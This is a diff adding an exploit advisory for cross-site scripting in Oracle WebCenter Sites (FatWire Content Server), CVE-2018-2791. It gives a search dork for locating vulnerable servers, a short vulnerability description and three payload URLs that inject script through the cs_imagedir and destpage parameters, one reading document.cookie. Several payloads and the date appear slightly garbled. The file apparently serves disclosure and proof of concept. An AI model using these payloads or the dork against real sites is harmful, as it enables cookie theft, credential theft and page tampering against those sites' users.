@@ -1,0 +1,55 @@
+# Exploit Title: Multiple XSS Oracle WebCenter Sites (FatWire Content
+Server) 7.x < 11gR1
+# Dork: inurl:Satellite?c
+# Date: 18.12.201
+# Exploit Author: Richard Alviarez
+# Vendor Homepage: http://oracle.com
+# Version: 7.x < 11gR1
+# CVE: CVE-2018-2791
+# Category: Webapps
+# Tested on: Kali linux
+====================================================
+
+# VULNERABILITY DESCRIPTION
+
+ The backend of the Content Server is prone to permanent and reflected
+ Cross-Site Scripting attacks. The vulnerability can be used to include
+ HTML- or JavaScript code to the affected web page. The code is executed
+ in the browser of users if they visit the manipulated site.
+ The vulnerability can be used to change the contents of the displayed
+site,
+ redirect to other sites or steal user credentials. Additionally, Portal
+ users are potential victims of browser exploits and JavaScript Trojans.
+
+====================================================
+
+
+# PoC : XSS :
+
+
+PAYLOAD:
+
+servlet/Satellite?c=Noticia&cid={ID}&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=eee%22%3E%3Cscript%3Ealert(123)%3C/script%3E%3C
+
+Note: {ID} Change for ID to site example (1362484193835)
+
+Other vulnerable parameters:
+
+PAYLOAD:
+
+servlet/Satellite?c=Noticia&cid={ID}&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=eee"<scriptalert(document.cookie)</script
+
+
+PAYLOAD:
+
+servlet/Satellite?destpage="<h1xxx<scriptalert(1)</script&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
+
+====================================================
+
+
+#Collaborators
+
+- CuriositySec
+- Vis0r
+- Oxd0m7
+- Vict0r
